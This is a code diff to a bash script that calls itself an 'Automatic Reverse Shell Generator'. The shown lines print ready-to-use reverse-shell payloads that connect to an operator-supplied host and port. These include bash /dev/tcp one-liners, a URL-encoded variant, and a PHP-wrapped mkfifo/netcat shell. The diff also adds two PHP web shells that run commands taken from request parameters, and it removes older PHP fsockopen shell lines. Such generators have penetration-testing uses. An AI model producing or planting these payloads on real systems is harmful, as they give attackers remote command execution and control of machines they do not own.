@@ -35,7 +35,7 @@ declare -r f23='Awk'
 declare -r f24='Xterm'
 declare -r f25='Gawk'
 declare -r f26='==============================================================='
-declare -r f27=''
+declare -r f27='Webshell'
 declare -r f28=''
 declare -r f29='Automatic Reverse Shell Generator'
 declare -r int="$1"
@@ -98,7 +98,7 @@ function bash(){
 	echo -e "\tbash -l > /dev/tcp/$lh/$lp 0<&1 2>&1"
 	echo ""
 	echo -e "\tbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lh%2F$lp%200%3E%261%22"
-	echo ""	
+	echo ""
 }
 
 function netcat(){
@@ -125,15 +125,13 @@ function php(){
 	echo ""
 	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f22$End"
 	echo ""
-	echo -e "\tphp -r '\$sock=fsockopen("$lh",$lp);exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
+	echo -e "\t<?php passthru('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f'); ?>"
 	echo ""
-	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);shell_exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
+	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f27$End"
 	echo ""
-	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);system("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
+	echo -e "\t<?php system(\$_GET['cmd']); ?>"
 	echo ""
-	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);popen("/bin/sh -i \<\&3 \>\&3 2\>\&3", "r");'"
-	echo ""
-	echo -e "\tphp -r '\$sock=fsockopen("$lh",$lp); $proc = proc_open("/bin/sh -i", array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);'"
+	echo -e "\t<?php echo '<pre>' . shell_exec(\$_REQUEST['cmd']) . '</pre>'; ?>"
 	echo ""
 }
 
